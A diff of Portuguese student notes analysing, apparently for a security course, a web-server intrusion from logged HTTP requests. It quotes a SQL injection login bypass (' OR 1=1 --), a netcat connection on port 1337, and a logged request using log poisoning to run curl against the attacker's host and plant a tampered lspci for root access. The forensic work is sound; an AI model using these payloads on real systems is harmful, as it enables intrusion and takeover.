@@ -21,8 +21,11 @@ e por isso o campo da password foi ignorado e o query do usermail foi "fechado",
 Ele queixou-se de username inválido! Eu diria que é porque obviamente nunca iria existir na base de dados um utilizador com nome "vazio", ou seja, 
 o query acaba por retornar um valor lógico falso.
 Acho estranho ele não estar a dar erro de DB Error, tendo em conta que na mesma ele está a procurar por um usermail igual a "vazio"!! Como no caso anterior.
+Ele deve dar erro de invalid username por causa das verificações de html que ele faz, porque, lá está, o campo do usermail é
+do tipo "email", logo tem aquelas verificações típicas de emails, e o próprio input não é válido" - verificação do lado do cliente.
 
 3º ele colocou no usermail=' OR 1=1 -- // e conseguiu entrar na conta de admin, mesmo sem nenhuma passe
+Obviamente que para conseguir dar login ele teve de mudar o campo do usermail para "text"
 Tal como no exemplo anterior, ele comentou o campo da password, não me vou estar a repetir.
 Para obter "dados", isto é, uma correpsondência de uma conta na base de dados, alguma parte na query tem de dar valor lógico verdadeiro obrigatoriamente!
 Ora, nada melhor do que garantir uma disjunção com um literal/condição sempre verdadeira... apesar do usermail introduzido ser "vazio", a condição
@@ -39,7 +42,7 @@ o input ele deixa de estar vazio e, então, o required do input html não se que
 4º UI, acho que ele modificou a palavra-passe!!
 Ele na tentativa anterior entrou na conta admin recorrendo a sql injection, e como podemos verificar pelo GET obtido, ele entrou na página onde 
 podia criar um post ou mudar as credenciais de acesso; ora, neste POST é possível verificar que ele desta vez entrou com o mail real do admin mas
-entrou com uma palavra-passe "típica" e "básica", "abc", por isso tudo indica que esta tenha sido mudada. Não seria difícil ao atacante descobrir o usermail~
+entrou com uma palavra-passe "típica" e "básica", "abc", por isso tudo indica que esta tenha sido mudada. Não seria difícil ao atacante descobrir o usermail
 real, pois este está exposto no servidor na página T&C.
 
 5º POST 112 O atacante conseguiu entrar na conta de administrador utilizando o usermail real e com palavra-passe vazia :OOOOO
@@ -229,6 +232,37 @@ nc é netcat, a flag - w está relacionada com o timeout que neste caso é de 5 
 Pelos vistos a porta 1337 é conhecida por ser uma porta para malware?? HUMMMMMMM
 https://www.auditmypc.com/tcp-port-1337.asp
 THIS IS NOT GOING TO END WELL...
+
+OLHA UMA CENA, a dúvida que tinhas tido sobre aparecer um </div> e depois outra div com class="products-list" quando abres o GET do brochure.php,
+é as linhas finais que aparecem no final do getfile.php
+
+Nós diríamos que ele começou a ter como user-agent é a representação do utilizador em software, basicamente se usares o mozilla aparece que o
+user-agent é o mozilla, etc etc, então é provável que o atacante agora tenha passado a utilizar scripts de python e importado python requests
+para fazer as operações seguintes.
+
+O prof tinha dito que o 1º mecanismo de segurança em VMs e pcs a correr serviços web a implementar é criar um utilizador com poucas permissões de acesso, não tem permissões para
+mexer nos ficheiros de fora -> talvez inicialmente o whoami inicial seria mesmo www-data e ele provavelmente conseguiu mudar para o user root
+
+Supostamente qualquer utilizador consegue modificar as variáveis de ambiente $PATH
+
+GET /display.php?type=1&lang=/var/log/apache2/access.log&cmd=curl%20http://192.168.1.118:8080/exploit%20--output%20/tmp/lspci HTTP/1.1 
+Então, ele tentou criar um novo endpoint e quis expor o conteúdo de lspci?? VER EXATAMENTE O CONTEÚDO DESTE FICHEIRO
+
+ver melhor o conteúdo do ficheiro apparmor_status
+
+Ele altera o lspci e ao listar system info deixa de aparecer devices, e do nada passa a ser root... WTF isto está relacionado??
+Pelos vistos o lspci está relacionado com definições de sistema, pelo que o Fábio tinha dito...
+
+Nós diríamos que ele tenha alterado o lspci e tenha metido o novo lspci dentro do /exploit - há código "interessante" ao abrires o GET /exploit, nomeadamente
+a linha da página web verde que salta xd
+
+Então, basicamente, ele ao fazer o curl da máquina dele (do atacante), ele vai buscar o ficheiro e de alguma forma ele deve ter conseguido escrever esse output num novo ficheiro lspci "modificado"/com malware no servidor,
+e nós supomos que o sys info necessite do conteúdo do lspci, e então, quando executa o sys info ele acaba por "infetar" a máquina; lembrar que o novo system info
+após ter sido modificado o lspci 
+
+
+
+
 
 
 
